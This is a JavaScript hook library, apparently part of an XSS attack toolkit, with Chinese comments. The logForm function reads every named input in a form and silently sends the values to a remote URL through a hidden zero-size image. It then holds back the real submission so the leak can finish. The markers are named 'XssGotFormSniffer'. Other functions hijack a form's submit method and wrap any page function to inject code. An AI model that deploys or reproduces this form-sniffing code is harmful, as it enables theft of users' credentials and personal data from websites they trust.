//alert("hooklib.js");
/////////////////////////////////////////////////////
//// hook模块 hook sumbmit; hook js function; 
//// hook link
/////////////////////////////////////////////////////
/*
* Name: hookSubmit
* Args:
*       o - specified form object
* e.g.
*       <form onkeydown="javascript: hookSubmit(this);" ..>
*
* If the form uses javascript to call submit method for submitting, you should install a hook on the form.
*/
function hookSubmit(o, injectFuncCallBack) {
	if (o.hooked == undefined) {
		o.hooked = true;
		o._submit = o.submit;

		o.submit = function() {
			//alert("submit hooked!");
			// hook函数的功能作为第二个参数在这里调用
			injectFuncCallBack();					
			o.onsubmit();
		}
	}
}


/*
* Name: logForm
* Args:
*       o - specified form object
*       url - the url you want to get with form information
*       delay - time span you want to delay
* e.g.
*       <form onsubmit="return logForm(this, 'http://www.target.com', 500);" method="post" ...>
*/
function logForm(o, url, delay) {
	//alert("logForm");
	var inputs = o.getElementsByTagName("input");
	//url += "?";
	var param = ""; // form的参数

	for (var i = 0; i < inputs.length; i ++) {
		if (inputs[i].getAttribute("name") != null && 
			inputs[i].getAttribute("name") != "") {
			param += escape(inputs[i].getAttribute("name")) + "=" + escape(inputs[i].value) + "&";
		}
	}
	
	// 记录提交的参数到远程服务器
	param = XssGotFormSniffer_S + escape(param) + XssGotFormSniffer_E;
	//getURL(url+param);
	var img = document.createElement("IMG");
	document.body.appendChild(img);
	img.width = 0;
	img.height = 0;
	img.src = url+param;

  // 让提交延时,保证logForm成功
	setTimeout(function(){
			if (o._submit != undefined) {
				o._submit();
			} else {
				o.submit();
			}
		}, delay);

	return false;
} 



//////////////////////////////////////////////////////////
// 一般JS函数的hook
// by axis
//////////////////////////////////////////////////////////
var hookJsFunction = function (){
	//alert("hookjsfunc");
  // 保存原函数;还是需要作为参数指定一个,
  //否则多次hook后会丢失之前保存的原函数
	//var RealFuncAfterHooked;  

  return {
	  hook: function(funcNameHooked, RealFuncAfterHooked, injectFunc){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("hook before: "+window[funcNameHooked]);
	  		  // 保存原函数
	  		  window[RealFuncAfterHooked] = window[funcNameHooked];
	  		  //window[funcNameHooked] = window[injectFunc];
	  		  // 参数个数可以根据需要进行调整
	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
	  			  window[injectFunc](parm1,param2,param3,param4,param5,param6,param7);   // 先执行注入的函数
	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // 再执行原函数
	  			  }
	  		  //alert("hook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  } catch (e){
			  return false;
		  }
	  },
	  
	  unhook: function(funcNameHooked, RealFuncAfterHooked){
	  	try {
	  	  setTimeout(function(){ 
	  		  //alert("unhook before: "+window[funcNameHooked]);
	  		  window[funcNameHooked] = function (parm1,param2,param3,param4,param5,param6,param7){
	  			  window[RealFuncAfterHooked](parm1,param2,param3,param4,param5,param6,param7);  // 执行原函数;
	  		  }
	  		  //alert("unhook after: "+window[funcNameHooked]);
	  		  }, 
		      10);
		    return true;
		  
		 } catch (e){
		 	  return false;
		 }
	  }
	};	
};

